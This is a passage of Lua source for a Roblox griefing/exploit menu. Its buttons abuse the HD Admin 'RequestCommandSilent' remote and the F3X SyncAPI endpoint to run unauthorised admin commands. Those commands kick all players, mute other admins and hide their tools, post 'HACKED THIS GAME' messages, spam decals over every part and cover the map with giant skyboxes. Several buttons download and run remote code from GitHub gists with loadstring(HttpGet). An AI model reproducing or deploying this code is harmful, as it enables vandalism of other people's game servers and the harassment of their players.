layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scroll

function BT(text, func)
	local button = Instance.new("TextButton")
	button.BackgroundColor3 = Color3.new(0, 0, 0)
	button.BorderColor3 = Color3.fromRGB(0, 53, 11)
	button.BorderSizePixel = 1
	button.TextColor3 = Color3.new(1, 1, 1)
	button.TextSize = 14
	button.TextScaled = true
	button.Text = text
	button.Size = UDim2.new(0, 300, 0, 200)
	button.Parent = scroll
	button.MouseButton1Click:Connect(func)
end

BT("Decal", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/6b1be5ddb50270c311da2ab694398c44/raw/a149a326f33ebfd1ef5d5d9a6a572cefa04b8158/Decal"))()
end)

BT("SkyBox", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/fde49c807c9b62bd0290fa47caf8c478/raw/2ae0f9417614d5390d3a0fb4de89db57d15fbf18/gistfile1.txt"))() 
end)

BT("Hint", function()
	RequestCommandSilent:InvokeServer(";sh TEAM K00PKIDD HAS HACKED THIS GAME.")
end)

BT("Particles", function()
	loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/5a37089a30153528fcf7d58b8552068a/raw/92b539e0114a613535ffa26ca910419d745e9d0b/Particles"))()
end)

BT("play theme", function()
	RequestCommandSilent:InvokeServer(";music 1839246711 ;volume inf")
end)

BT("666", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/160f28b726f975bed311756d180fa2d0/raw/b0196979ac731ac61b074a92d9e17a405d1bde5a/666"))()
end)

BT("UnAnchor", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/ecd3df69b3fae922f35d04337be41d09/raw/0b2e8fc180b155d6cb709d1f17abe58ce5ded66b/Cracked"))()
end)

BT("Shutdown", function()
	local plr = game:GetService("Players").LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommandSilent:InvokeServer(";kick all Teh Game Iz Duked Up!1!")
	wait(1)
	plr:Kick("Teh Game Iz Duked Up!1!")
end)

BT("disco", function()
	RequestCommandSilent:InvokeServer(";disco")
end)

BT("Gravity Hammer", function()
	RequestCommandSilent:InvokeServer(";gear me 48088344")
end)

BT("Destroy. [ONLY FOR EMERGENCY]", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/3f913cb07342f5f5a81aa3ec570de764/raw/a191ecec982d894601ee70640d7604a8cefe4505/Realm"))()
end)

BT("Message", function()
	RequestCommandSilent:InvokeServer(";sm EL K0PARAZ HAXXORED THIS GAME1!1!1")
end)
    end
})
    
AddButton({
    Name = "Teams",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";createteam red ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam blue ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam db ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam green ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam dg ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam pk ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam p ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam y ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam o ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam black ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam white ANGira249 Was Here")
    end
})
AddButton({
    Name = "Anti Admin Fuckers",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfly others")
SilentRequest:InvokeServer(";uncmdbar2 others")
SilentRequest:InvokeServer(";hideguis others")
SilentRequest:InvokeServer(";mute others")
    end
})
AddButton({
    Name = "Shedletsky",
    Callback = function()
-- =========================
-- HD ADMIN ENV COMMANDS
-- =========================
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";time 6 ;fogcolor black")

-- DO NOT DELETE THIS LEAVE MY CREDIT
-- Fast Skybox + Original Particle Logic (QuickPart / F3X Fast Builder)
-- Original particle behavior kept, ONLY build method optimized (Rain Toad technique)

-- =========================
-- SERVICES
-- =========================
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

-- =========================
-- GET F3X / SYNCAPI
-- =========================
local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
end

local f3x = getf3x()
if not f3x then
	warn("No F3X / SyncAPI found")
	return
end

local endpoint = f3x.SyncAPI.ServerEndpoint

-- =========================
-- FAST INVOKE
-- =========================
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			endpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- =========================
-- QUICK PART (FAST BUILD)
-- =========================
local function quickPart(cf, size, extra)
	task.spawn(function()
		local p = endpoint:InvokeServer("CreatePart", "Normal", cf, workspace)
		if not p then return end

		fastInvoke({"SyncResize", {{
			Part = p,
			CFrame = cf,
			Size = size
		}}})

		if extra then extra(p) end
	end)
end

-- =========================
-- GIANT SKYBOX
-- =========================
local function GiantSky(textureId)
	local hrp = char:WaitForChild("HumanoidRootPart")
	local pos = hrp.Position + Vector3.new(0, 6, 0)

	quickPart(CFrame.new(pos), Vector3.new(5,5,5), function(p)
		fastInvoke({"SyncAnchor", {{Part = p, Anchored = true}}})
		fastInvoke({"CreateMeshes", {{Part = p}}})
		fastInvoke({"SyncMesh", {{Part = p, MeshId = "rbxassetid://111891702759441"}}})
		fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. textureId}}})
		fastInvoke({"SyncMesh", {{Part = p, Scale = Vector3.new(109888,109888,109888)}}})
		fastInvoke({"SyncMesh", {{Part = p, VertexColor = Vector3.new(4,4,4)}}})
		fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
		fastInvoke({"SetLocked", {p}, true})
	end)
end

-- =========================
-- PARTICLES (ORIGINAL LOGIC)
-- =========================
local PARTICLE_TEXTURE = "85312612489831"
local PARTICLE_SIZE = Vector3.new(5,5,0.01)

local function spawnParticle(head)
	local startCF = head.CFrame + Vector3.new(0,3,0)

	quickPart(startCF, PARTICLE_SIZE, function(p)
		fastInvoke({"SyncAnchor", {{Part = p, Anchored = true}}})
		fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
		fastInvoke({"SyncMaterial", {{Part = p, Transparency = 1}}})

		fastInvoke({"CreateTextures", {{Part = p, Face = Enum.NormalId.Front, TextureType = "Decal"}}})
		fastInvoke({"CreateTextures", {{Part = p, Face = Enum.NormalId.Back, TextureType = "Decal"}}})

		fastInvoke({"SyncTexture", {{Part = p, Face = Enum.NormalId.Front, TextureType = "Decal", Texture = "rbxassetid://" .. PARTICLE_TEXTURE}}})
		fastInvoke({"SyncTexture", {{Part = p, Face = Enum.NormalId.Back, TextureType = "Decal", Texture = "rbxassetid://" .. PARTICLE_TEXTURE}}})

		task.spawn(function()
			local baseY = startCF.Position.Y
			for i = 1, 40 do
				fastInvoke({"SyncResize", {{
					Part = p,
					CFrame = CFrame.new(
						head.Position.X,
						baseY + (i * 1.2),
						head.Position.Z
					),
					Size = PARTICLE_SIZE
				}}})
				task.wait(0.08)
			end
			fastInvoke({"Remove", {p}})
		end)
	end)
end

-- =========================
-- PARTICLE LOOP
-- =========================
local function particleLoop(plr)
	while plr.Parent do
		task.wait(0.5)

		local c = plr.Character
		local hum = c and c:FindFirstChildOfClass("Humanoid")
		local head = c and c:FindFirstChild("Head")

		if hum and head and hum.Health > 0 then
			spawnParticle(head)
		end
	end
end

-- =========================
-- START SYSTEMS
-- =========================
GiantSky("172423468")

for _, plr in ipairs(Players:GetPlayers()) do
	task.spawn(particleLoop, plr)
end

Players.PlayerAdded:Connect(function(plr)
	task.spawn(particleLoop, plr)
end)

-- =========================
-- HD ADMIN MUSIC (NO DELAY)
-- =========================
SilentRequest:InvokeServer(";music 105336676258720 ;pitch .175 ;volume inf")
    end
})
AddButton({
    Name = "c00lify v2",
    Callback = function()
        
-- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("158118263") -- spam decals first
GiantSky("139653027079448") -- giant skybox second
    end
})
AddButton({
    Name = "Normal Disco",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";disco")
    end
})
AddButton({
    Name = "Mario.exe Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("12851404448")
    end
})
AddButton({
    Name = "Mario.exe Skybox",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("12851404448")
    end
})
AddButton({
    Name = "You Are A idiot",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 3200130016")
SilentRequest:InvokeServer(";volume inf")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

-- Locate SyncAPI tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper

local function _(args)

	remote:InvokeServer(unpack(args))

end

-- === Utility Functions ===

local function CreatePart(cf, parent)

	_({"CreatePart", "Normal", cf, parent})

end

local function SetAnchor(part, state)

	_({"SyncAnchor", {{Part = part, Anchored = state}}})

end

local function SetCollision(part, state)

	_({"SyncCollision", {{Part = part, CanCollide = state}}})

end

local function AddMesh(part)

	_({"CreateMeshes", {{Part = part}}})

end

local function SetMesh(part, meshid)

	_({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})

end

local function SetTexture(part, texid)

	_({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})

end

local function MeshResize(part, size)

	_({"SyncMesh", {{Part = part, Scale = size}}})

end

local function SetLocked(part, state)

	_({"SetLocked", {part}, state})

end

local function SpawnDecal(part, side)

	_({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})

end

local function AddDecal(part, asset, side)

	_({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})

end

-- === Sky Function ===

local function Sky(id)

	local hrp = char:WaitForChild("HumanoidRootPart")

	local cf = hrp.CFrame

	local pos = cf.Position + Vector3.new(0, 6, 0)

	CreatePart(CFrame.new(pos), workspace)

	task.wait(0.3) -- tiny delay for the part to exist

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then

			SetAnchor(v, true)

			AddMesh(v)

			SetMesh(v, "111891702759441")

			SetTexture(v, id)

			MeshResize(v, Vector3.new(65000, 65000, 65000))

		end

	end

end

-- === Spam Decals Function ===

local function Spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			task.spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

-- === Call Sky and Spam silently ===

Sky("4616500111")

Spam("4616500111")
    end
})
AddButton({
    Name = "Me? Sky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("131759102825983")
    end
})
AddButton({
    Name = "Me? Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("131759102825983")
    end
})
AddButton({
    Name = "Kick all",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";kick all cry about it!!")
    end
})
AddButton({
    Name = "Rainbow Sword",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear me 159229806")
    end
})
AddButton({
    Name = "Luger Gun",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear me 95354288")
    end
})
AddButton({
    Name = "Fire Sword",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear me 95951330")
    end
})
AddButton({
    Name = "Spawn Zombie",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";insert 187789986")
    end
})
AddButton({
    Name = "Spawn Soldier",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";insert 187790284")
    end
})
AddButton({
    Name = "Luger Gun All",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear all 95354288")
    end
})
AddButton({
    Name = "Cmdbar",
    Callback = function()
        --// Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

--// Silent Request
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "HDCommandGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 250, 0, 120)
Frame.Position = UDim2.new(0.35, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "Silent Cmdbar Remake"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = Frame

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.9, 0, 0, 40)
TextBox.Position = UDim2.new(0.05, 0, 0.35, 0)
TextBox.PlaceholderText = "Type commands here)"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 14
TextBox.ClearTextOnFocus = false
TextBox.Parent = Frame

local TextCorner = Instance.new("UICorner", TextBox)
TextCorner.CornerRadius = UDim.new(0, 8)

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Size = UDim2.new(0.9, 0, 0, 30)
ExecuteButton.Position = UDim2.new(0.05, 0, 0.75, 0)
ExecuteButton.Text = "Execute Command"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.TextSize = 14
ExecuteButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
ExecuteButton.Parent = Frame

local ButtonCorner = Instance.new("UICorner", ExecuteButton)
ButtonCorner.CornerRadius = UDim.new(0, 8)

--// Button Behavior
ExecuteButton.MouseButton1Click:Connect(function()
	local cmd = TextBox.Text
	if cmd ~= "" then
		task.spawn(function()
			pcall(function()
				SilentRequest:InvokeServer(cmd)
			end)
		end)
	end
end)

--// Optional: Spam Mode (hold click)
ExecuteButton.MouseButton1Down:Connect(function()
	while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
		local cmd = TextBox.Text
		if cmd ~= "" then
			pcall(function()
				SilentRequest:InvokeServer(cmd)
			end)
		end
